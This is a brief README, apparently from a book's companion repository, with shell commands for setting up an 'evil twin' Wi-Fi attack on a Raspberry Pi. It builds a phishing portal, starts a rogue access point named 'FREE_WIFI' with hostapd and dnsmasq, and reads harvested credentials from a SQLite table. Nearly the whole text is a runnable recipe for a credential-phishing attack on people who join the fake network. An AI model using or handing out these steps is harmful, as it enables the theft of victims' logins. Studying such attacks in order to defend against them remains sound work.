# Evil Twin

On a Raspberry Pi with Rust installed and connected to internet by ethernet:

First, build the phishing portal:
```shell
$ cargo install wasm-pack
$ git clone https://github.com/skerkour/black-hat-rust.git && cd black-hat-rust/ch_09/evil_twin
$ make -C ../phishing/ rpi && cp -r ../phishing/dist/* .

```

Then:
```shell
$ sudo apt install -y macchanger hostapd dnsmasq sqlite3 libssl-dev
$ sudo ./server -p 80 &
$ sudo ./evil_twin.sh
```


Then visit the `FREE_WIFI` wifi network.


To access the phished credentials:
```
$ sqlite3 db.sqlite
sqlite> SELECT * FROM credentials;
```


You can update the SSID (access point's name) in `hostapd.conf`.
